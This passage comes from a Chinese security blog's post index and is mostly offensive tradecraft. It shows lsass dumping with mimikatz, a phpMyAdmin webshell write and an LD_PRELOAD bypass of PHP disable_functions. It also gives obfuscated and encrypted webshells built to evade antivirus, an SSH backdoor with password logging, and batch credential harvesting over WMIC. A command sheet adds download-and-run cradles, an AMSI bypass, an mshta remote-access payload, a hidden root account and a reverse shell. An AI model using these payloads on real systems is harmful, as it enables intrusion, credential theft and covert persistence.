web安全开发指南:https://github.com/FallibleInc/security-guide-for-developers各个知名厂商漏洞测试报告模板：https://github.com/juliocesarfort/public-pentesting-reports linux下恶意代码检测包： https://github.com/rfxn/linux-malware-detect操作系统运行指标可视化框架：https://github.com/facebook/osquery恶意代码分析系统：https://github.com/cuckoosandbox/cuckoo定期搜索及存储web应用：https://github.com/Netflix/Scumblr事件响应框架：https://github.com/google/grr综合主机监控检测平台：https://github.com/ossec/ossec-hids分布式实时数字取证系统：https://github.com/mozilla/migMicrosoft &amp; Unix 文件系统及硬盘取证工具：https://github.com/sleuthkit/sleuthkit蜜罐：SSH蜜罐：https://github.com/desaster/kippo蜜罐集合资源：https://github.com/paralax/awesome-honeypots kippo进阶版蜜罐：https://github.com/micheloosterhof/cowrieSMTP 蜜罐：https://github.com/awhitehatter/mailoneyweb应用程序蜜罐：https://github.com/mushorg/glastopf数据库蜜罐：https://github.com/jordan-wright/elastichoneyweb蜜罐：https://github.com/atiger77/Dionaea远控：用gmail充当C&amp;C服务器的后门https://github.com/byt3bl33d3r/gcat开源的远控：https://github.com/UbbeLoL/uRATc#远控：https://github.com/hussein-aitlahcen/BlackHole原文 Python工具库安全工具总纲]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码]]></title>
    <url>%2Farchives%2Ff86fa73d.html</url>
    <content type="text"><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit(注:必须使用管理员权限) 成功获取明文密码]]></content>
      <categories>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Phpmyadmin getshell]]></title>
    <url>%2Farchives%2F694daf10.html</url>
    <content type="text"><![CDATA[查看是否有写文件权限show global variables like &apos;%secure%&apos;;查看日志文件存放路径及开启SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos; set global general_log = ONgetshell 三大命令:set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径 SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;]]></content>
      <categories>
        <category>后渗透</category>
        <category>外网渗透</category>
        <category>提权(WEB)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Structs全版本漏洞利用总结]]></title>
    <url>%2Farchives%2F91cb19b5.html</url>
    <content type="text"><![CDATA[前言Structs2框架目前已知的漏洞编号如下：S2-005 S2-009 S2-016 (含S2-013) S2-019 S2-020 S2-021 S2-032 S2-037（含S2-033) DevMode S2-045 S2-046 S2-048 S2-052 S2-055 S2-057目前公开的工具，唯独缺失052和055的利用。S2-055比较特殊，严格来说055本身无问题，问题出在其使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。也就是说S2-055本质上是Jackson反序列化，其CVE编号为CVE-2017-7525。本文将对缺失的S2-055以及S2-052做漏洞复现.原文:struct 2 全版本漏洞总结]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[彻底理解Windows认证 - 议题解读]]></title>
    <url>%2Farchives%2F58b20026.html</url>
    <content type="text"><![CDATA[彻底理解Windows认证 - 议题解读:原文:彻底理解window认证]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「disablefunc绕过」一种绕过php disablefunc的方法复现]]></title>
    <url>%2Farchives%2F2ea7b633.html</url>
    <content type="text"><![CDATA[前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。 环境搭建ubuntu+apache2+php7.2 配置/etc/php/7.2/apache2/php.ini 设置disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,然后重启apache2 服务器 这样就能把system禁用了 然后在网站的根目录上放一个shell.php &lt;?php @eval($_GET[&apos;fz41&apos;]);?&gt;访问shell.php可以正常执行php的代码，不能执行系统函数。 测试访问http://192.168.44.139/shell.php?fz41=phpinfo();可以看见phpinfo()的信息 访问http://192.168.44.139/shell.php?fz41=system(ls);没有任何回显环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 原理解读LD_PRELOAD的作用LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtimelinker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的 我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system() attribute((constructor))GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。 因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了 代码类似这种#define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void preloadme (void) { unsetenv(&quot;LD_PRELOAD&quot;); const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); system(cmdline); }工具使用https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 复现gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so 然后写利用如下php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt;然后访问http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so参考链接https://www.freebuf.com/articles/web/192052.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD来源:https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>Php特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SSRF中的绕过姿势]]></title>
    <url>%2Farchives%2Fc0cf419.html</url>
    <content type="text"><![CDATA[从以下URL关键字中寻找SSRF漏洞： share wap url link src source target u 3g display sourceURl imageURL domain ...http://127.0.0.1/ 被过滤的时候，可以尝试一下几种方式： 1、@ http://abc@127.0.0.12、添加端口号 http://127.0.0.1:80803、短地址 http://dwz.cn/11SMa4、可以指向任意ip的域名：xip.io 10.0.0.1.xip.io 10.0.0.1 www.10.0.0.1.xip.io 10.0.0.1 mysite.10.0.0.1.xip.io 10.0.0.1 foo.bar.10.0.0.1.xip.io 10.0.0.15、ip地址转换成进制来访问 115.239.210.26 ＝ 16373751032首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用http://00+转换后十六进制 115.239.210.26 = 0x73.0xef.0xd2.0x1a八进制 115.239.210.26 = 0163.0357.0322.0032]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[不知道列名的情况下注入]]></title>
    <url>%2Farchives%2Fa90cd968.html</url>
    <content type="text"><![CDATA[0x00 简介mysql版本,低于5.4的除了堆叠,别的就写不了了在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询 select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass: select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替： select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列： select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; 原文: 不知列名的情况下注入]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>数据库特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透过程中的SSH(后门建立)]]></title>
    <url>%2Farchives%2F21b719d6.html</url>
    <content type="text"><![CDATA[1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接在肉鸡上执行： [root@localhost ~]# cd /usr/sbin [root@localhost sbin]# mv sshd ../bin [root@localhost sbin]# echo &apos;#!/usr/bin/perl&apos; &gt;sshd [root@localhost sbin]# echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd [root@localhost sbin]# echo &apos;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd [root@localhost sbin]# chmod u+x sshd [root@localhost sbin]# /etc/init.d/sshd restart 在本机执行： socat STDIO TCP4:10.18.180.20:22,sourceport=13377 如果你想修改源端口，可以用python的struct标准库实现 &gt;&gt;&gt; import struct &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526) &gt;&gt;&gt; print repr(buffer) &apos;\x00\x00LF&apos; &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377) &gt;&gt;&gt; print buffer4A 记录SSH客户端连接密码搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。在肉鸡上修改要记录密码用户目录的.bashrc，添加一行: alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos; 之后查看tmp目录的记录： grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log]]></content>
      <categories>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>权限维持</category>
        <category>Linux权限维持</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[域渗透中找DC]]></title>
    <url>%2Farchives%2Fbd98337b.html</url>
    <content type="text"><![CDATA[1.net view net view /domain2.set log set log3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp4.使用nltest nltest /dclist:corp5.使用dsquery DsQuery Server -domain corp6.使用netdom netdom query pdc这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用Invoke-Mimikatz.ps1批量获取windows密码]]></title>
    <url>%2Farchives%2Fed9d09ca.html</url>
    <content type="text"><![CDATA[通常可以使用以下方式获取登陆windows的密码：powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法： 1.创建共享文件夹： cd\ mkdir open net share open=C:\open /grant:everyone,full icacls C:\open\ /grant Everyone:(OI)(CI)F /t 修改注册表 reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1 修改共享目录到open。 2.在共享目录添加下列文件： 1）执行脚本powershellme.cmd，脚本内容： powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.11:8080/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1 ip是设置共享的主机ip地址。 2）Invoke-Mimikatz.ps1 3）mongoose 4）服务器列表serverlist.txt，换行分割。 3.运行mongoose，默认开启端口8080 4.执行wmic： wmic /node:@serverlist.txt process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;带凭证： wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot; 5.在共享目录看各个服务器的密码吧。 6.清除记录： 1）关掉mongoose,并删除 2）net share open /delete 3）删除共享目录及文件 4）修改注册表 PS:可以使用如下命令开启PowerShell remoting： psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &quot;enable-psremot]]></content>
      <categories>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「木马变形」一句话木马的各种变形]]></title>
    <url>%2Farchives%2F54ea983c.html</url>
    <content type="text"><![CDATA[0x00:简介 一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。一句话木马一直在跟杀软斗智斗勇，出现一种，杀软秒更新规则。木马再变形，再被杀。。。出现0x01:叙事 一、常见的一句话例子： **ASP:&lt;%eval request(&quot;pass&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt; PHP:&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt; JSP:&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;//无回显示执行系统命令**二、简单变形**ASP:&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7 ASPX:&lt;%@ Page Language = Jscript %&gt; &lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/ &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+ &quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+ &quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval (/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7 PHP:&lt;?php $_GET[a]($_GET[b]);?&gt; JSP:&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;**三、二次变形ASP:&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;{0:yyyyMMdd}&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;, &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码 PHP:&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;JSP：&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 三次变形ASP:&lt;%@Page Language=&quot;C#&quot; %&gt;&lt;%@Import namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null){ Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;//蚁剑中的一句话 PHP:&lt;?php session_start();isset($_GET[&apos;pass&apos;])?print $_SESSION[&apos;k&apos;]=substr(md5(uniqid(rand())),16):($b=explode(&apos;|&apos;,openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $_SESSION[&apos;k&apos;])))&amp;call_user_func($b[0],$b[1]);?&gt;//蚁剑中的一句话 JSP:&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;//蚁剑中的一句话四次变形 1、利用随机异或无限免杀d盾蚁剑版： 项目地址：https://github.com/yzddmr6/as_webshell_venom 2、利用动态二进制加密实现新型一句话木马： 文章地址：https://xz.aliyun.com/t/2799 第N次变形。。。。。 0x02:后话 一句话木马变形有很多种方式，文中举例只是其中几种方式。千奇百怪的变形，不断的变化，都是为了躲避杀软的检测。杀软也在不断的更新规则库。两者都是在博弈中不断的强大。 请勿非法利用 来源:微信公众号]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Commands 搜集(持续更新)]]></title>
    <url>%2Farchives%2F7eaedcae.html</url>
    <content type="text"><![CDATA[Linux Linux反弹shell后，方便的交互：python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;无python时：expect -c &apos;spawn bash;interact&apos;无wget nc等下载工具时下载文件exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl修改上传文件时间戳(掩盖入侵痕迹) touch -r 老文件时间戳 新文件时间戳利用BASH提权 这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令导入: export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND”lsof 命令lsof 1.txt 显示开启文件 abc.txt 的进程 lsof -i :22 知道 22 端口现在运行什么程序 lsof -c nsd 显示 nsd 进程现在打开的文件 lsof -g gid 显示归属 gid 的进程情况 lsof +d /usr/local/ 显示目录下被进程开启的文件 lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长 lsof -d 4 显示使用 fd 为4 的进程 lsof -i [i] 用以显示符合条件的进程情况SSH端口转发下面文章详细描述了3种方式转发 http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html图片马Exiftool “-comment&lt;=raj.php” 1.pngWindowsPowershell 相关 获取无线密码：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&apos;);Get-Wlan-Keys &quot;提权加账号powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user evi1cg test123 /add&apos;&quot;下载执行：powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&apos;,&apos;C:\\Users\Public\\test.jpg&apos;) &amp; start C:\\Users\\Public\\test.jpg摄像头录像：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&apos;); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi&quot;录音:powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&apos;);Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias &apos;SECRET&apos;&quot; MSHTA VBSCRIPT EXEC mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close) JAVASCRIPT EXEC mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} JSRAT mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} Bypass AMSI: PS C:\&gt; [Ref].Assembly.GetType(&apos;System.Management.Automation.AmsiUtils&apos;).GetField(&apos;amsiInitFailed&apos;,&apos;NonPublic,Static&apos;).SetValue($null,$true) use: powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(&apos;&apos;System.Management.Automation.AmsiUtils&apos;&apos;).GetField(&apos;&apos;amsiInitFailed&apos;&apos;,&apos;&apos;NonPublic,Static&apos;&apos;).SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(&apos;&apos;http://192.168.230.1/msfpayload.ps1&apos;&apos;) Bypass AV sqlite3.exe -cmd &quot;select load_extension(&apos;1.txt&apos;,&apos;EP&apos;)&quot; sqlite3.exe -cmd &quot;select load_extension(&apos;\\192.168.1.101\share\1.txt&apos;,&apos;EP&apos;)&quot;mimikatz 获取vpn密码mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit读取chrome cookiesmimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit提权常用// What system are we connected to? systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;// Get the hostname and username (if available) hostname echo %username%// Get users net users net user [username]// Networking stuff ipconfig /all// Printer? route print// ARP-arific arp -A// Active network connections netstat -ano// Firewall fun (Win XP SP2+ only) netsh firewall show state netsh firewall show config// Scheduled tasks schtasks /query /fo LIST /v// Running processes to started services tasklist /SVC net start// Driver madness DRIVERQUERY// WMIC fun (Win 7/8 – XP requires admin) wmic /?//Use wmic_info script! // WMIC: check patch level wmic qfe get Caption,Description,HotFixID,InstalledOn// Search pathces for given patch wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot;// AlwaysInstallElevated fun reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated// Other commands to run to hopefully get what we need dir /s *pass* == *cred* == *vnc* == *.config* findstr /si password *.xml *.ini *.txt reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s// Service permissions sc query sc qc [service_name]// Accesschk stuff download link accesschk.exe /accepteula (always do this first!!!!!) accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!) accesschk.exe -uwcqv &quot;Authenticated Users&quot; * (won&apos;t yield anything on Win 8) accesschk.exe -ucqv [service_name]// Find all weak folder permissions per drive. accesschk.exe -uwdqs Users c:\ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\// Find all weak file permissions per drive. accesschk.exe -uwqs Users c:\*.* accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*// Binary planting sc config [service_name] binpath= &quot;C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe&quot; sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot; sc qc [service_name] (to verify!) net start [service_name] CMD %ProgramData:~0,1%%ProgramData:~9,2% /c echo命令行下载certutil -urlcache -split -f example.com/file]]></content>
      <categories>
        <category>后渗透</category>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「应急响应」应急响应实战笔记,一个安全工程师的自我修养]]></title>
    <url>%2Farchives%2Fdf6dc829.html</url>
    <content type="text"><![CDATA[应急响应实战笔记,一个安全工程师的自我修养。 项目目录[第一章：应急响应]第1篇:Window入侵排查 第2篇:Linux入侵排查[第二章：日志分析] 第1篇:Window日志分析 第2篇:Linux日志分析 第3篇:Web日志分析 第4篇:MSSQL日志分析 第5篇:MySQL日志分析[第三章:Windows实战篇]第1篇：FTP暴力破解 第2篇：蠕虫病毒 第3篇：勒索病毒 第4篇：ARP病毒 第5篇：挖矿病毒（一） 第6篇：挖矿病毒（二）[第四章：Linux实战篇]第1篇：SSH暴力破解 第2篇：捕捉短连接 第3篇：挖矿病毒 第4篇：盖茨木马 第5篇：DDOS病毒 第6篇：Shell病毒[第五章：Web实战篇]第1篇：网站被植入Webshell 第2篇：门罗币恶意挖矿 第3篇：批量挂黑页 第4篇：新闻源网站劫持 第5篇：移动端劫持 第6篇：搜索引擎劫持 第7篇：网站首页被篡改 第8篇：管理员账号被篡改]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
  </entry>
  <entry>
